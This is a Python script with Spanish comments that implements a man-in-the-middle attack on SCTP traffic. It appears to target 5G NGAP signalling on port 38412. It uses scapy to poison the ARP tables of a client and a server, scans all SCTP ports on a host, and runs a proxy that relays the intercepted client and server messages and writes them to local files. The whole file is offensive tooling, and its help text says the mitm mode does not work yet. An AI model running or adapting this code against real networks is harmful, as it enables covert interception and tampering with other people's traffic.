# -*- coding: utf-8 -*-
"""
Created on Thu May  8 19:25:51 2025

@author: alberto
"""
import scapy.all as scapy
import socket
import sctp
import threading
import argparse
import time

# Define los valores por defecto del servidor víctima (No es necesario)

FAKE_SERVER_IP = '127.0.0.1'
FAKE_SERVER_PORT = 38412
REAL_CLIENT_MAC = "00:00:00:00"
REAL_CLIENT_IP = '10.10.10.7'
REAL_SERVER_IP = '10.10.10.155'
REAL_SERVER_PORT = 38412

# Función para obtener la MAC
def get_mac(ip): 
    arp_request = scapy.ARP(pdst = ip) 
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast / arp_request 
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0] 
    return answered_list[0][1].hwsrc 

# Función para realizar ARP Spoofing
def arp_spoof_basic(target_ip, spoof_ip):

    # Get the MAC address of the target IP
    target_mac = scapy.getmacbyip(target_ip)
    # Create the ARP packet
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # Send the ARP packet
    scapy.send(packet, verbose=False)
    # Return the MAC address of the target IP
    return target_mac

#    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=spoof_ip)
#    scapy.send(packet, verbose=False)

# Función para restaurar los valores originales en las tablas ARP
def restore(destination_ip, source_ip): 
    print(destination_ip)
    #destination_mac = get_mac(destination_ip) 
    destination_mac = scapy.getmacbyip(destination_ip)
    print(str(destination_mac + " - " + destination_ip))
    #source_mac = get_mac(source_ip) 
    source_mac = scapy.getmacbyip(source_ip)
    print(str(source_mac + " - " + source_ip))
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac) 
    scapy.sendp(scapy.Ether(dst=destination_mac)/packet, verbose = False) 
      
# Realizar ARP Spoofing

def arp_spoof(client_ip, server_ip):
    try:
        while True:
           REAL_CLIENT_MAC = arp_spoof_basic(client_ip, server_ip)
           REAL_SERVER_MAC = arp_spoof_basic(server_ip, client_ip)
           time.sleep(1)
    except KeyboardInterrupt: 
        print("\nCtrl + C pressed.............Exiting") 
        restore(client_ip, server_ip) 
        restore(server_ip, client_ip) 
        print("[+] Arp Spoof Stopped")    

# Función para escanear puertos SCTP
def scan_sctp_ports(ip):
    open_ports = []
    for port in range(1, 65536):
        sock = sctp.sctpsocket_tcp(socket.AF_INET)
        sock.settimeout(1)
        try:
            sock.connect((ip, port))
            open_ports.append(port)
        except:
            pass
        finally:
            sock.close()
    return open_ports

# Función para manejar la comunicación SCTP entre cliente y servidor
def handle_sctp_communication(client_sock, server_ip, server_port):
    server_sock = sctp.sctpsocket_tcp(socket.AF_INET)
    server_sock.connect((server_ip, server_port))
    
    while True:
        data = client_sock.recv(1024)
        if not data:
            break
        print(f"Received from client: {data}")
        server_sock.send(data)
        

        response = server_sock.recv(1024)
        print(f"Received from server: {response}")
        client_sock.send(response)
    
    client_sock.close()
    server_sock.close()

# Función para manejar como proxy la conexión desde un cliente hasta el servidor real
def handle_client(client_socket, server_ip,sctp_port, initial_chunk):
    inicio = True
    while True:
        if inicio:
            real_server_socket = sctp.sctpsocket_tcp(socket.AF_INET)
            real_server_socket.initparams.max_instreams = 10
            real_server_socket.initparams.num_ostreams = 10
            real_server_socket.connect((server_ip, sctp_port))

            # Send the initial chunk to the real server
            real_server_socket.send(initial_chunk)
            inicio = False
            print("Inicio = False")

        client_data = client_socket.recv(1024)
        if not client_data:
            break

        with open('client_data.txt', 'a') as f:
            f.write(client_data.decode() + '\n')

            
            real_server_socket.send(client_data)
    
            server_response = real_server_socket.recv(1024)
    
        with open('server_response.txt', 'a') as f:
            f.write(server_response.decode() + '\n')
    
        client_socket.send(server_response)
        
    real_server_socket.close()
    client_socket.close()

# Función para iniciar la función de proxy
def start_proxy_server(server_ip, sctp_port):
    fake_server_socket = sctp.sctpsocket_tcp(socket.AF_INET)
    fake_server_socket.bind((FAKE_SERVER_IP, sctp_port))
    fake_server_socket.listen(5)
    
    print(f"Proxy SCTP server started at {FAKE_SERVER_IP}:{sctp_port}")
    real_server_socket = sctp.sctpsocket_tcp(socket.AF_INET)
    real_server_socket.connect((server_ip, sctp_port))
    print(f"Real server already connected...")
    while True:
        client_socket, addr = fake_server_socket.accept()
        print(f"Connection accepted from {addr}")

        # Capturar el chunk inicial de SCTP
        initial_chunk = client_socket.recv(1024)
    
        with open('initial_sctp_chunk.txt', 'a') as f:
            f.write(initial_chunk.decode() + '\n')

        client_thread = threading.Thread(target=handle_client, args=(client_socket, server_ip, sctp_port, initial_chunk))
        client_thread.start()


# Función principal para realizar el ataque MITM
def mitm_attack(client_ip, server_ip):
    
    # Escanear puertos SCTP en el servidor
    open_ports = scan_sctp_ports(server_ip)
    
    # Crear servidores SCTP falsos para cada puerto abierto
    for port in open_ports:
        print("SCTP port = " + str(port)) 
        sock = sctp.sctpsocket_tcp(socket.AF_INET)
        sock.bind((client_ip, port))
        sock.listen(5)
        
        threading.Thread(target=handle_sctp_communication, args=(sock.accept()[0], server_ip, port)).start()

    # Realizar ARP Spoofing
    arp_spoof(client_ip, server_ip)
    arp_spoof(server_ip, client_ip)


def main():
    parser = argparse.ArgumentParser(description="SCTP Server Options")
    parser.add_argument("option", choices=["scan", "spoof", "unspoof", "proxy", "mitm", "help"], help="Operation to perform")
    parser.add_argument("server_ip", nargs="?", help="Server IP address")
    parser.add_argument("client_ip", nargs="?", help="Client IP address (required for spoof)")
    parser.add_argument("sctp_port", type=int, nargs="?", help="SCTP port (required for proxy)")   
    
    args = parser.parse_args()
    
    if args.option == "help":
        print("Options:")
        print("  scan <server_ip>         - Scan SCTP ports on the specified server IP")
        print("  spoof <client_ip> <server_ip> - Perform ARP spoofing between the client and server IPs")
        print("  unspoof <client_ip> <server_ip> - Perform ARP restauration between the client and server IPs")
        print("  proxy <server_ip> <sctp_port> - Start a proxy SCTP server that listens on the specified port and forwards data to the server IP")
        print("  mitm <client_ip> <server_ip> <sctp_port> - Start a proxy SCTP server that listens on the specified port and forwards data to the server IP (NO FUNCIONA.... AUN)")
        return
    
    if args.option == "scan":
        if not args.server_ip:
            print("Server IP is required for scan option")
            return
        open_ports = scan_sctp_ports(args.server_ip)
        for port in open_ports:
            print("SCTP port = " + str(port)) 
    elif args.option == "spoof":
        if not args.client_ip or not args.server_ip:
            print("Client IP and Server IP are required for spoof option")
            return
        
        # Start ARP spoofing in a separate thread
        try:
            spoof_thread = threading.Thread(target=arp_spoof, args=(args.client_ip, args.server_ip))
            spoof_thread.start()
        except KeyboardInterrupt: 
            print("\nCtrl + C pressed.............Exiting") 
            restore(args.client_ip, args.server_ip) 
            restore(args.server_ip, args.client_ip) 
            print("[+] Arp Spoof Stopped")    
        #ANTERIOR: arp_spoof(args.client_ip, args.server_ip)
    elif args.option == "unspoof":
        if not args.client_ip or not args.server_ip:
            print("Client IP and Server IP are required for unspoof option")
            return
        # Start restauration
        restore(args.client_ip, args.server_ip) 
        restore(args.server_ip, args.client_ip) 
        print("[+] Arp Spoof Stopped")    

    elif args.option == "proxy":
        if not args.server_ip or not args.sctp_port:
            print("Server IP and SCTP port are required for proxy option")
            return
        start_proxy_server(args.server_ip, args.sctp_port)
    elif args.option == "mitm":
        if not args.server_ip or not args.sctp_port:
            print("Client IP, Server IP and SCTP port are required for Man-In-The-Middle option")
            return
        # Start ARP spoofing in a separate thread
        spoof_thread = threading.Thread(target=arp_spoof, args=(args.client_ip, args.server_ip))
        spoof_thread.start()
        #ANTERIOR: arp_spoof(args.client_ip, args.server_ip)
        print("[+] Spoofing STARTED!!!")
        start_proxy_server(args.server_ip, args.sctp_port)


if __name__ == "__main__":
    main()
